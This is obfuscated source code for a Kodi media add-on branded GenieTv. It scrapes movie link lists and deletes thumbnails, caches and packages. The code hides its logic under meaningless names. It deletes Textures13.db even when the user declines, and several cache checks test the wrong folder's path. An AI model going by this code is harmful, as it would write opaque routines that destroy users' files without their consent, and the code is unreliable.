 if 92 - 92: OoooooooOO . Ooo00oOo00o / Ii11I + Ooo00oOo00o
def ii1Ii11Ii1i ( url ) :
 Ii1IIiiIIi = iii ( iiI1IiI + OooO0O0oo ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOooOOOoOo = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( Ii1IIiiIIi )
 for i1I1I , url , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II in oOooOOOoOo :
  O0Oo000ooO00 ( i1I1I , url , 42 , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 64 - 64: I1IiI % I1IiI + OOooOOo + Oo
def OO0oO0Oo ( url ) :
 Ii1IIiiIIi = iii ( iiI1IiI + OoooOO0 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOooOOOoOo = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( Ii1IIiiIIi )
 for i1I1I , url , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II in oOooOOOoOo :
  O0Oo000ooO00 ( i1I1I , url , 42 , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 69 - 69: OoOoOO00 + O00oo0OO0oOOO
def oooOOO ( url ) :
 Ii1IIiiIIi = iii ( iiI1IiI + Iii1o00o0 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOooOOOoOo = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( Ii1IIiiIIi )
 for i1I1I , url , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II in oOooOOOoOo :
  O0Oo000ooO00 ( i1I1I , url , 42 , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 84 - 84: I1IiI - Oo . OO0O . i1i1i11IIi - Oo
def o0Oo0oO00Oooo ( url ) :
 Ii1IIiiIIi = iii ( iiI1IiI + Ii1II1I11i1I ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOooOOOoOo = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( Ii1IIiiIIi )
 for i1I1I , url , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II in oOooOOOoOo :
  O0Oo000ooO00 ( i1I1I , url , 42 , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 91 - 91: Ooo00oOo00o / Ooo00oOo00o . OoOoOO00 . OO0O - OOOo0
def iii11 ( url ) :
 Ii1IIiiIIi = iii ( iiI1IiI + OO0oO ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOooOOOoOo = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( Ii1IIiiIIi )
 for i1I1I , url , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II in oOooOOOoOo :
  O0Oo000ooO00 ( i1I1I , url , 42 , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 35 - 35: OOOO00ooo0Ooo + Ii11I / Ii11I
def i1IIIi1Iii1i ( url ) :
 Ii1IIiiIIi = iii ( iiI1IiI + oO0o0O ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOooOOOoOo = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( Ii1IIiiIIi )
 for i1I1I , url , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II in oOooOOOoOo :
  O0Oo000ooO00 ( i1I1I , url , 42 , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 50 - 50: iIii1I11I1II1 * ii
def o0OoIII1IIiIi1 ( url ) :
 Ii1IIiiIIi = iii ( iiI1IiI + OOO0O ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOooOOOoOo = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( Ii1IIiiIIi )
 for i1I1I , url , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II in oOooOOOoOo :
  O0Oo000ooO00 ( i1I1I , url , 42 , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 47 - 47: o0OOOoO0 + OoOoOO00 / OOOo0 - OoooooooOO + o0OOOoO0
def IIIIiI1I11iiI ( url ) :
 Ii1IIiiIIi = iii ( iiI1IiI + i11II1 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOooOOOoOo = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( Ii1IIiiIIi )
 for i1I1I , url , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II in oOooOOOoOo :
  O0Oo000ooO00 ( i1I1I , url , 5 , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 86 - 86: Oo
 if 88 - 88: o0OOOoO0 * OOOo0
 if 30 - 30: I1IiI / ii / OOooOooo * OOooOOo * ii . OOOo0
 if 93 - 93: I1IiI
 if 97 - 97: i11iIiiIii
 if 68 - 68: i1i1i11IIi * Ooo00oOo00o . OOOO00ooo0Ooo / OOooOooo . OOooOOo - i11iIiiIii
 if 49 - 49: Oo / OOooOooo % OOOO00ooo0Ooo + ii - Ooo00oOo00o
 if 13 - 13: OoOoOO00
 if 83 - 83: OoooooooOO . OOOo0 + OOooOooo * O0 / ii
def IiiiI11 ( ) :
 try :
  if os . path . exists ( oOOoO0 ) == True :
   i1iiIIiiI111 = xbmcgui . Dialog ( )
   if i1iiIIiiI111 . yesno ( "Delete Thumbnails" , "[COLOR gold][B]##########WARNING ANDROID ONLY##########[/B][/COLOR]" , "This feature deletes your thumbnail folder and textures13.db" , "Are you sure you want to do proceed? This Can NOT Be Undone" ) :
    for IIIIIii1ii11 , IiiIiI1Ii1i , i1iIi in os . walk ( oOOoO0 ) :
     OoooOOo0oOO = 0
     OoooOOo0oOO += len ( i1iIi )
     if OoooOOo0oOO > 0 :
      for Ii1II1I11i1 in i1iIi :
       os . unlink ( os . path . join ( IIIIIii1ii11 , Ii1II1I11i1 ) )
  i1iiIIiiiI = os . path . join ( OOooO0OOoo , "Textures13.db" )
  os . unlink ( i1iiIIiiiI )
  i1iiIIiiI111 . ok ( "Restart KODI" , "Please restart KODI to rebuild thumbnail library" )
 except :
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "Error Deleting Thumbnails please visit Kodi Support Group, GenieTv on facebook" )
 return
 if 26 - 26: OO0O % ii + OOOo0 / i1i1i11IIi . OOOo0
 if 38 - 38: OoooooooOO + OoooooooOO - i11iIiiIii * OOOo0 * i1IIi / OoOoOO00
 if 78 - 78: Oo - o0OOOoO0 + O00oo0OO0oOOO * OOooOooo * OOooOOo
 if 23 - 23: Oo - O0
 if 33 - 33: ii11ii1ii
 if 54 - 54: OO0O * ii11ii1ii . OoOoOO00 / Ii11I % Ii11I
 if 25 - 25: i11iIiiIii + ii11ii1ii - OoooooooOO . O0 % o0OOOoO0
 if 53 - 53: i1IIi
 if 59 - 59: OOooOOo + OOOo0 % OoooooooOO - iIii1I11I1II1
def iiIII1i1 ( url ) :
 print '############################################################       DELETING STANDARD CACHE             ###############################################################'
 oOOo0OOoOO0 = os . path . join ( xbmc . translatePath ( 'special://home' ) , 'cache' )
 if os . path . exists ( oOOo0OOoOO0 ) == True :
  for IIIIIii1ii11 , IiiIiI1Ii1i , i1iIi in os . walk ( oOOo0OOoOO0 ) :
   OoooOOo0oOO = 0
   OoooOOo0oOO += len ( i1iIi )
   if 30 - 30: OoOoOO00 / OOOo0 - OO0O + I1IiI * OO0O / I1IiI
   if 17 - 17: Ooo00oOo00o
   if OoooOOo0oOO > 0 :
    if 31 - 31: ii + OoooooooOO - OOooOooo % OOooOOo / OOooOOo / iIii1I11I1II1
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete KODI Cache Files" , str ( OoooOOo0oOO ) + " files found" , "Do you want to delete them?" ) :
     if 31 - 31: OoooooooOO - OOooOooo . i1i1i11IIi % ii
     for Ii1II1I11i1 in i1iIi :
      try :
       os . unlink ( os . path . join ( IIIIIii1ii11 , Ii1II1I11i1 ) )
      except :
       pass
     for O0OOO0OOooo00 in IiiIiI1Ii1i :
      try :
       shutil . rmtree ( os . path . join ( IIIIIii1ii11 , O0OOO0OOooo00 ) )
      except :
       pass
       if 16 - 16: Ii11I * OOooOooo % o0OOOoO0 / i1i1i11IIi + iIii1I11I1II1 / OOOo0
   else :
    pass
 if xbmc . getCondVisibility ( 'system.platform.ATV2' ) :
  IIII1I1 = os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'Other' )
  if 36 - 36: OOooOooo * OOOO00ooo0Ooo . OOOO00ooo0Ooo / Oo / OOOo0
  for IIIIIii1ii11 , IiiIiI1Ii1i , i1iIi in os . walk ( IIII1I1 ) :
   OoooOOo0oOO = 0
   OoooOOo0oOO += len ( i1iIi )
   if 80 - 80: OoooooooOO - i1IIi
   if OoooOOo0oOO > 0 :
    if 51 - 51: i1IIi . I1IiI / I1IiI % i11iIiiIii * Ii11I - o0OOOoO0
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete ATV2 Cache Files" , str ( OoooOOo0oOO ) + " files found in 'Other'" , "Do you want to delete them?" ) :
     if 49 - 49: Oo - iIii1I11I1II1
     for Ii1II1I11i1 in i1iIi :
      os . unlink ( os . path . join ( IIIIIii1ii11 , Ii1II1I11i1 ) )
     for O0OOO0OOooo00 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( IIIIIii1ii11 , O0OOO0OOooo00 ) )
      if 64 - 64: o0OOOoO0 + iIii1I11I1II1
   else :
    pass
  I1Iii = os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'LocalAndRental' )
  if 30 - 30: i1IIi . ii11ii1ii
  for IIIIIii1ii11 , IiiIiI1Ii1i , i1iIi in os . walk ( I1Iii ) :
   OoooOOo0oOO = 0
   OoooOOo0oOO += len ( i1iIi )
   if 77 - 77: OoOoOO00 - i11iIiiIii
   if OoooOOo0oOO > 0 :
    if 78 - 78: OOooOooo
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete ATV2 Cache Files" , str ( OoooOOo0oOO ) + " files found in 'LocalAndRental'" , "Do you want to delete them?" ) :
     if 72 - 72: o0OOOoO0 * Ooo00oOo00o
     for Ii1II1I11i1 in i1iIi :
      os . unlink ( os . path . join ( IIIIIii1ii11 , Ii1II1I11i1 ) )
     for O0OOO0OOooo00 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( IIIIIii1ii11 , O0OOO0OOooo00 ) )
      if 89 - 89: I1IiI + OOOo0
   else :
    pass
    if 68 - 68: OOOO00ooo0Ooo / iIii1I11I1II1 . Oo + i11iIiiIii + OOooOOo
    if 92 - 92: Ooo00oOo00o . OOooOOo . OOooOooo % I1IiI
    if 58 - 58: ii11ii1ii % OOooOooo * OOooOooo - O00oo0OO0oOOO
    if 9 - 9: OO0O - OOooOooo % OoOoOO00 + i1i1i11IIi + Ii11I % O0
 o00OoOo0 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.whatthefurk/cache' ) , '' )
 if os . path . exists ( o00OoOo0 ) == True :
  for IIIIIii1ii11 , IiiIiI1Ii1i , i1iIi in os . walk ( o00OoOo0 ) :
   OoooOOo0oOO = 0
   OoooOOo0oOO += len ( i1iIi )
   if 2 - 2: OoOoOO00 + i1IIi
   if 68 - 68: Ii11I + OOooOooo
   if OoooOOo0oOO > 0 :
    if 58 - 58: i1i1i11IIi * OOooOooo . i1IIi
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete WTF Cache Files" , str ( OoooOOo0oOO ) + " files found" , "Do you want to delete them?" ) :
     if 19 - 19: ii
     for Ii1II1I11i1 in i1iIi :
      os . unlink ( os . path . join ( IIIIIii1ii11 , Ii1II1I11i1 ) )
     for O0OOO0OOooo00 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( IIIIIii1ii11 , O0OOO0OOooo00 ) )
      if 85 - 85: OO0O - OOOo0 / i1IIi / Ooo00oOo00o / OoOoOO00
   else :
    pass
    if 94 - 94: iIii1I11I1II1 + i1i1i11IIi
    if 44 - 44: Ooo00oOo00o + OOOO00ooo0Ooo % Ooo00oOo00o + i1IIi + O00oo0OO0oOOO + O0
 Ii1iII1ii1 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.4od/cache' ) , '' )
 if os . path . exists ( Ii1iII1ii1 ) == True :
  for IIIIIii1ii11 , IiiIiI1Ii1i , i1iIi in os . walk ( Ii1iII1ii1 ) :
   OoooOOo0oOO = 0
   OoooOOo0oOO += len ( i1iIi )
   if 80 - 80: iIii1I11I1II1 / i11iIiiIii + O00oo0OO0oOOO
   if 41 - 41: o0OOOoO0 + Ooo00oOo00o * OOOo0 * O0 * Oo - I1IiI
   if OoooOOo0oOO > 0 :
    if 96 - 96: OOOo0 - iIii1I11I1II1
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete 4oD Cache Files" , str ( OoooOOo0oOO ) + " files found" , "Do you want to delete them?" ) :
     if 25 - 25: OoooooooOO . OOooOooo % O00oo0OO0oOOO . i1i1i11IIi
     for Ii1II1I11i1 in i1iIi :
      os . unlink ( os . path . join ( IIIIIii1ii11 , Ii1II1I11i1 ) )
     for O0OOO0OOooo00 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( IIIIIii1ii11 , O0OOO0OOooo00 ) )
      if 67 - 67: OoooooooOO + o0OOOoO0 / OO0O
   else :
    pass
    if 75 - 75: i1i1i11IIi / OoooooooOO . OOOo0 + o0OOOoO0 - OoOoOO00
    if 33 - 33: i1i1i11IIi / i1i1i11IIi . i11iIiiIii * ii11ii1ii + OOooOOo
 ii1iI11IiIIi = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.iplayer/iplayer_http_cache' ) , '' )
 if os . path . exists ( ii1iI11IiIIi ) == True :
  for IIIIIii1ii11 , IiiIiI1Ii1i , i1iIi in os . walk ( ii1iI11IiIIi ) :
   OoooOOo0oOO = 0
   OoooOOo0oOO += len ( i1iIi )
   if 47 - 47: Ii11I . ii + I1IiI % i1i1i11IIi % i1IIi / iIii1I11I1II1
   if 95 - 95: O0 . Ooo00oOo00o
   if OoooOOo0oOO > 0 :
    if 89 - 89: i1IIi
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete BBC iPlayer Cache Files" , str ( OoooOOo0oOO ) + " files found" , "Do you want to delete them?" ) :
     if 19 - 19: OO0O / OOooOOo % i1i1i11IIi - OOooOooo
     for Ii1II1I11i1 in i1iIi :
      os . unlink ( os . path . join ( IIIIIii1ii11 , Ii1II1I11i1 ) )
     for O0OOO0OOooo00 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( IIIIIii1ii11 , O0OOO0OOooo00 ) )
      if 14 - 14: ii11ii1ii - i11iIiiIii * o0OOOoO0
   else :
    pass
    if 39 - 39: OoooooooOO
    if 19 - 19: i11iIiiIii
    if 80 - 80: OOOo0
 oO0OOo = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/script.module.simple.downloader' ) , '' )
 if os . path . exists ( oO0OOo ) == True :
  for IIIIIii1ii11 , IiiIiI1Ii1i , i1iIi in os . walk ( oO0OOo ) :
   OoooOOo0oOO = 0
   OoooOOo0oOO += len ( i1iIi )
   if 63 - 63: OoOoOO00 . o0OOOoO0 % i1i1i11IIi + OoOoOO00
   if 81 - 81: Ii11I - OOOo0 % OOooOOo
   if OoooOOo0oOO > 0 :
    if 7 - 7: OO0O - i1IIi . I1IiI
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete Simple Downloader Cache Files" , str ( OoooOOo0oOO ) + " files found" , "Do you want to delete them?" ) :
     if 12 - 12: i1i1i11IIi / Ooo00oOo00o / O0 * i1i1i11IIi
     for Ii1II1I11i1 in i1iIi :
      os . unlink ( os . path . join ( IIIIIii1ii11 , Ii1II1I11i1 ) )
     for O0OOO0OOooo00 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( IIIIIii1ii11 , O0OOO0OOooo00 ) )
      if 51 - 51: OO0O * O00oo0OO0oOOO / i1IIi
   else :
    pass
    if 2 - 2: ii + i1i1i11IIi . O00oo0OO0oOOO - i1IIi + o0OOOoO0
    if 54 - 54: OoooooooOO . ii - O00oo0OO0oOOO
 oO0o00o000Oo0 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.itv/Images' ) , '' )
 if os . path . exists ( oO0o00o000Oo0 ) == True :
  for IIIIIii1ii11 , IiiIiI1Ii1i , i1iIi in os . walk ( oO0o00o000Oo0 ) :
   OoooOOo0oOO = 0
   OoooOOo0oOO += len ( i1iIi )
   if 1 - 1: OOOo0 - o0OOOoO0
   if 62 - 62: Ooo00oOo00o . O00oo0OO0oOOO . O00oo0OO0oOOO % i1IIi * ii % Oo
   if OoooOOo0oOO > 0 :
    if 20 - 20: OO0O . i1i1i11IIi / OOOO00ooo0Ooo . OoooooooOO * Ii11I + OOooOooo
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete ITV Cache Files" , str ( OoooOOo0oOO ) + " files found" , "Do you want to delete them?" ) :
     if 2 - 2: OOOo0
     for Ii1II1I11i1 in i1iIi :
      os . unlink ( os . path . join ( IIIIIii1ii11 , Ii1II1I11i1 ) )
     for O0OOO0OOooo00 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( IIIIIii1ii11 , O0OOO0OOooo00 ) )
      if 11 - 11: Ii11I + iIii1I11I1II1 / I1IiI % O0
   else :
    pass
    if 98 - 98: OoOoOO00 + Oo * iIii1I11I1II1 * ii11ii1ii + Ii11I * OOooOooo
    if 76 - 76: OO0O . ii
 oO00OO0o0ooO = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.movies4me/cache' ) , '' )
 if os . path . exists ( oO0o00o000Oo0 ) == True :
  for IIIIIii1ii11 , IiiIiI1Ii1i , i1iIi in os . walk ( oO00OO0o0ooO ) :
   OoooOOo0oOO = 0
   OoooOOo0oOO += len ( i1iIi )
   if 42 - 42: O0 * O00oo0OO0oOOO . I1IiI / Ii11I - OOooOooo . OOOO00ooo0Ooo
   if 57 - 57: OOooOOo + Oo * ii11ii1ii - OO0O % iIii1I11I1II1 - OOooOooo
   if OoooOOo0oOO > 0 :
    if 37 - 37: Ooo00oOo00o * OOOO00ooo0Ooo + OOooOooo + ii11ii1ii * OOooOOo
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete Movies4me Cache Files" , str ( OoooOOo0oOO ) + " files found" , "Do you want to delete them?" ) :
     if 95 - 95: OOooOooo - i11iIiiIii % i11iIiiIii - O0 * o0OOOoO0
     for Ii1II1I11i1 in i1iIi :
      os . unlink ( os . path . join ( IIIIIii1ii11 , Ii1II1I11i1 ) )
     for O0OOO0OOooo00 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( IIIIIii1ii11 , O0OOO0OOooo00 ) )
      if 81 - 81: OoOoOO00 * OOOo0 % i1IIi * i11iIiiIii + I1IiI
   else :
    pass
    if 100 - 100: i1IIi % OOooOooo
    if 55 - 55: OOOo0 + O00oo0OO0oOOO
 OO00o0 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.phstreams/Cache' ) , '' )
 if os . path . exists ( oO0o00o000Oo0 ) == True :
  for IIIIIii1ii11 , IiiIiI1Ii1i , i1iIi in os . walk ( OO00o0 ) :
   OoooOOo0oOO = 0
   OoooOOo0oOO += len ( i1iIi )
   if 11 - 11: OOOo0 - OoooooooOO + OoOoOO00 + Oo % O00oo0OO0oOOO
   if 90 - 90: OOOo0 * ii11ii1ii . OOOO00ooo0Ooo * OOooOooo - OOooOOo
   if OoooOOo0oOO > 0 :
    if 40 - 40: O0 / i1i1i11IIi - OoOoOO00 + OOooOOo % Oo
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete Phoenix Cache Files" , str ( OoooOOo0oOO ) + " files found" , "Do you want to delete them?" ) :
     if 93 - 93: OO0O
     for Ii1II1I11i1 in i1iIi :
      os . unlink ( os . path . join ( IIIIIii1ii11 , Ii1II1I11i1 ) )
     for O0OOO0OOooo00 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( IIIIIii1ii11 , O0OOO0OOooo00 ) )
      if 82 - 82: ii11ii1ii / OO0O . i11iIiiIii + Ii11I - I1IiI / O00oo0OO0oOOO
   else :
    pass
    if 99 - 99: ii / i1IIi
    if 2 - 2: ii . O00oo0OO0oOOO
 II1II111 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.spotitube/cache' ) , '' )
 if os . path . exists ( oO0o00o000Oo0 ) == True :
  for IIIIIii1ii11 , IiiIiI1Ii1i , i1iIi in os . walk ( II1II111 ) :
   OoooOOo0oOO = 0
   OoooOOo0oOO += len ( i1iIi )
   if 71 - 71: OoOoOO00 % o0OOOoO0 + OOOo0 * OO0O + i1i1i11IIi . OO0O
   if 25 - 25: OO0O . OOooOOo % OOOo0 + O00oo0OO0oOOO
   if OoooOOo0oOO > 0 :
    if 61 - 61: ii % OO0O - ii11ii1ii + ii . I1IiI
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete YouTube Music Cache Files" , str ( OoooOOo0oOO ) + " files found" , "Do you want to delete them?" ) :
     if 44 - 44: ii11ii1ii / O0 - i1i1i11IIi + Ii11I . OOOO00ooo0Ooo . ii11ii1ii
     for Ii1II1I11i1 in i1iIi :
      os . unlink ( os . path . join ( IIIIIii1ii11 , Ii1II1I11i1 ) )
     for O0OOO0OOooo00 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( IIIIIii1ii11 , O0OOO0OOooo00 ) )
      if 95 - 95: I1IiI % o0OOOoO0 % i1IIi * OOooOOo + Ii11I
   else :
    pass
    if 34 - 34: o0OOOoO0 * OOooOOo . OOOo0 % i11iIiiIii
    if 61 - 61: iIii1I11I1II1 + ii * OOOO00ooo0Ooo - i1IIi % ii
 oOOo = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.supercartoons/cache' ) , '' )
 if os . path . exists ( oO0o00o000Oo0 ) == True :
  for IIIIIii1ii11 , IiiIiI1Ii1i , i1iIi in os . walk ( oOOo ) :
   OoooOOo0oOO = 0
   OoooOOo0oOO += len ( i1iIi )
   if 9 - 9: o0OOOoO0 - Ooo00oOo00o + iIii1I11I1II1 % O0 + OOOO00ooo0Ooo + i1i1i11IIi
   if 50 - 50: i1IIi + OO0O
   if OoooOOo0oOO > 0 :
    if 64 - 64: OOooOOo % ii . OO0O
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete SuperCartoons Cache Files" , str ( OoooOOo0oOO ) + " files found" , "Do you want to delete them?" ) :
     if 6 - 6: OO0O / i11iIiiIii - Oo
     for Ii1II1I11i1 in i1iIi :
      os . unlink ( os . path . join ( IIIIIii1ii11 , Ii1II1I11i1 ) )
     for O0OOO0OOooo00 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( IIIIIii1ii11 , O0OOO0OOooo00 ) )
      if 3 - 3: i1i1i11IIi - OoooooooOO * OoooooooOO - OOOo0 / o0OOOoO0 * ii11ii1ii
   else :
    pass
    if 58 - 58: i1i1i11IIi % iIii1I11I1II1 / i11iIiiIii % OOooOOo . o0OOOoO0 * O00oo0OO0oOOO
    if 32 - 32: OoooooooOO + OOooOOo
 o0000OOOo = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.tvonline.cc/cache' ) , '' )
 if os . path . exists ( oO0o00o000Oo0 ) == True :
  for IIIIIii1ii11 , IiiIiI1Ii1i , i1iIi in os . walk ( o0000OOOo ) :
   OoooOOo0oOO = 0
   OoooOOo0oOO += len ( i1iIi )
   if 56 - 56: i1IIi + OoooooooOO % Ooo00oOo00o
   if 36 - 36: O00oo0OO0oOOO * OOOO00ooo0Ooo * O0 * Ii11I - OOooOOo / ii11ii1ii
   if OoooOOo0oOO > 0 :
    if 54 - 54: i1IIi - Ooo00oOo00o / OoooooooOO
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete TVonline Cache Files" , str ( OoooOOo0oOO ) + " files found" , "Do you want to delete them?" ) :
     if 95 - 95: O0 + iIii1I11I1II1 . ii11ii1ii
     for Ii1II1I11i1 in i1iIi :
      os . unlink ( os . path . join ( IIIIIii1ii11 , Ii1II1I11i1 ) )
     for O0OOO0OOooo00 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( IIIIIii1ii11 , O0OOO0OOooo00 ) )
      if 61 - 61: OOooOooo * OOooOooo
   else :
    pass
    if 70 - 70: o0OOOoO0 . ii11ii1ii / OOooOOo * ii
    if 74 - 74: OOOo0 . OO0O / O00oo0OO0oOOO . i1i1i11IIi
 OO00 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.youtube/kodion' ) , '' )
 if os . path . exists ( oO0o00o000Oo0 ) == True :
  for IIIIIii1ii11 , IiiIiI1Ii1i , i1iIi in os . walk ( OO00 ) :
   OoooOOo0oOO = 0
   OoooOOo0oOO += len ( i1iIi )
   if 10 - 10: OOOO00ooo0Ooo * i1IIi . ii / o0OOOoO0 . Ii11I / o0OOOoO0
   if 1 - 1: O00oo0OO0oOOO % OO0O
   if OoooOOo0oOO > 0 :
    if 99 - 99: O00oo0OO0oOOO + iIii1I11I1II1 . Ii11I / Ooo00oOo00o * ii11ii1ii
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete YouTube Cache Files" , str ( OoooOOo0oOO ) + " files found" , "Do you want to delete them?" ) :
     if 87 - 87: i1i1i11IIi / OoOoOO00 % Ooo00oOo00o % Ooo00oOo00o
     for Ii1II1I11i1 in i1iIi :
      os . unlink ( os . path . join ( IIIIIii1ii11 , Ii1II1I11i1 ) )
     for O0OOO0OOooo00 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( IIIIIii1ii11 , O0OOO0OOooo00 ) )
      if 28 - 28: I1IiI % ii - Ii11I + Ii11I + ii / iIii1I11I1II1
   else :
    pass
    if 91 - 91: OOOo0 / OoOoOO00 * Ii11I
    if 94 - 94: OoOoOO00 - iIii1I11I1II1 - iIii1I11I1II1
    if 83 - 83: ii11ii1ii * iIii1I11I1II1 + I1IiI * i1IIi . OoooooooOO % OOooOooo
 oOoOo00oo = xbmc . translatePath ( 'special://masterprofile/addon_data/plugin.video.genesis' )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 try :
  if i1iiIIiiI111 . yesno ( "Delete Genesis Cache Files" , "Do you want to delete cache" ) :
   II11IiIIiiiii = os . path . join ( oOoOo00oo , "cache.db" )
   os . unlink ( II11IiIIiiiii )
   if 66 - 66: O0 * OOooOOo / ii11ii1ii
 except :
  pass
  if 15 - 15: Ii11I . OOooOOo + OoooooooOO - Oo * iIii1I11I1II1 . i1IIi
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "                               Finished Deleting Cache " , "                          [COLOR gold]Brought To You By GenieTv[/COLOR]" )
 if 39 - 39: OOooOooo % i1IIi . ii11ii1ii - O0
 if 65 - 65: ii * ii / OOOO00ooo0Ooo + ii % OO0O + I1IiI
 if 92 - 92: OOooOOo
 if 37 - 37: ii
 if 18 - 18: i1i1i11IIi * i11iIiiIii + iIii1I11I1II1 % OOOO00ooo0Ooo + i1IIi - Ooo00oOo00o
 if 85 - 85: Ooo00oOo00o * OOOO00ooo0Ooo + Ooo00oOo00o
 if 39 - 39: Oo / i1IIi % i1IIi
 if 20 - 20: Ii11I * ii
 if 91 - 91: Ooo00oOo00o % i1IIi - iIii1I11I1II1 . Ii11I
def IIiiIiIIiI1 ( url ) :
 print '###' + o0oOoO00o + ' - DELETING PACKAGES###'
 I1IiIoO0o0o = xbmc . translatePath ( os . path . join ( 'special://home/addons/packages' , '' ) )
 try :
  for IIIIIii1ii11 , IiiIiI1Ii1i , i1iIi in os . walk ( I1IiIoO0o0o ) :
   OoooOOo0oOO = 0
   OoooOOo0oOO += len ( i1iIi )
   if 94 - 94: i1i1i11IIi % OOooOooo % i11iIiiIii . i1i1i11IIi
   if 6 - 6: o0OOOoO0 / OoooooooOO / O00oo0OO0oOOO / o0OOOoO0 + O00oo0OO0oOOO - I1IiI
   if OoooOOo0oOO > 0 :
